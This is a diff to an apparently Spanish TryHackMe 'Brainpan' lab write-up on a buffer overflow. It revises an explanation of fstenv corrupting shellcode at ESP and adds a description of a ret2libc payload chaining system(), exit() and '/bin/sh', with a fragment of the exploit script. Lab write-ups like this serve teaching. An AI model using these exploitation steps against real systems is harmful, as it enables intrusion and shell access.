@@ -793,7 +793,7 @@ B1 52            </span><span class="o">MOV </span><span class="mi">CL</span><sp
 3168 13          </span><span class="o">XOR </span><span class="no">DWORD </span><span class="na">PTR </span><span class="mi">DS</span><span class="p">:[</span><span class="mi">EAX</span><span class="o">+</span><span class="mi">13</span><span class="p">],</span><span class="mi">EBP</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El <code class="language-plaintext highlighter-rouge">problema</code> es bastante evidente y es que guarda el estado del FPU en el <code class="language-plaintext highlighter-rouge">ESP</code>, pero el shellcode inicia en el <code class="language-plaintext highlighter-rouge">ESP</code>, significa que el <code class="language-plaintext highlighter-rouge">shellcode</code> se corrompe a si mismo</p>
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">problema</code> es bastante evidente, <code class="language-plaintext highlighter-rouge">fstenv</code> esta almacenando información en <code class="language-plaintext highlighter-rouge">ESP</code>, pero el shellcode inicia en el <code class="language-plaintext highlighter-rouge">ESP</code>, significa que el <code class="language-plaintext highlighter-rouge">shellcode</code> se corrompe a si mismo</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">D97424 F4        </span><span class="o">FSTENV </span><span class="p">(</span><span class="mi">28</span><span class="o">-</span><span class="no">BYTE</span><span class="p">) </span><span class="na">PTR</span><span class="mi"> SS</span><span class="p">:[</span><span class="mi">ESP</span><span class="o">-</span><span class="na">C</span><span class="p">]  </span>
 </code></pre></div></div><br>
@@ -1624,6 +1624,9 @@ addr_bin_sh </span><span class="o">= </span><span class="no">b</span><span class
 
 </span><span class="no">print</span><span class="p">(junk </span><span class="o">+ </span><span class="p">addr_system </span><span class="o">+ </span><span class="p">addr_exit </span><span class="o">+ </span><span class="p">addr_bin_sh)  </span>
 </code></pre></div></div><br>
+
+<p class="plain-text">De esta manera en el <code class="language-plaintext highlighter-rouge">EIP</code> ejecutariamos <code class="language-plaintext highlighter-rouge">system()</code> como función, <code class="language-plaintext highlighter-rouge">exit()</code> como función de <code class="language-plaintext highlighter-rouge">retorno</code> y le pasaremos la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> como <code class="language-plaintext highlighter-rouge">argumento</code> a system()</p>
+<a href="/thm/brainpan/17.png" target="_blank"><div><p><img src="/thm/brainpan/17.png"></p></div></a>
 
 <p class="plain-text">Sin embargo tenemos un problema y es que la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> cambia constantemente, esto es porque el <code class="language-plaintext highlighter-rouge">ASLR</code> esta activado y hay aleatorizacion</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
